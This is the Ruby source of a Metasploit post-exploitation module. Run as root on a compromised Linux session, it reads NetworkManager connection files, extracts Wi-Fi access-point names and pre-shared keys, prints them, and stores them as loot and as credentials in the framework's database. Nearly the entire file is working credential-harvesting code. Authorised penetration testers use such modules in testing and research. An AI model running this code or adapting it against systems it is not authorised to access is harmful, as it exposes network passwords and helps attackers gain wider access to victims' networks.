##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Gather NetworkManager 802-11-Wireless-Security Credentials',
        'Description' => %q{
          This module collects 802-11-Wireless-Security credentials such as
          Access-Point name and Pre-Shared-Key from Linux NetworkManager
          connection configuration files.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Cenk Kalpakoglu'],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptString.new('DIR', [true, 'The path for NetworkManager configuration files', '/etc/NetworkManager/system-connections/'])
    ])
  end

  def connections_directory
    datastore['DIR']
  end

  def extract_psk_from_file(path)
    return if path.blank?

    print_status("Reading file #{path}")
    data = read_file(path)

    return if data.blank?

    data.each_line do |l|
      next unless l.starts_with?('psk=')

      psk = l.split('=')[1].strip

      return psk unless psk.blank?
    end

    nil
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'You must run this module as root!')
    end

    connection_files = dir(connections_directory)

    if connection_files.blank?
      print_status('No network connections found')
      return
    end

    tbl = Rex::Text::Table.new({
      'Header' => '802-11-wireless-security',
      'Columns' => ['AccessPoint-Name', 'PSK'],
      'Indent' => 1
    })

    connection_files.each do |f|
      psk = extract_psk_from_file("#{connections_directory}/#{f}")
      tbl << [f, psk] unless psk.blank?
    end

    if tbl.rows.empty?
      print_status('No wireless PSKs found')
      return
    end

    print_line("\n#{tbl}")

    p = store_loot(
      'linux.psk.creds',
      'text/csv',
      session,
      tbl.to_csv,
      'wireless_credentials.txt'
    )

    print_good("Credentials stored in: #{p}")

    tbl.rows.each do |cred|
      user = cred[0] # AP name
      password = cred[1]
      create_credential(
        workspace_id: myworkspace_id,
        origin_type: :session,
        address: session.session_host,
        session_id: session_db_id,
        post_reference_name: refname,
        username: user,
        private_data: password,
        private_type: :password
      )
    end
  end
end
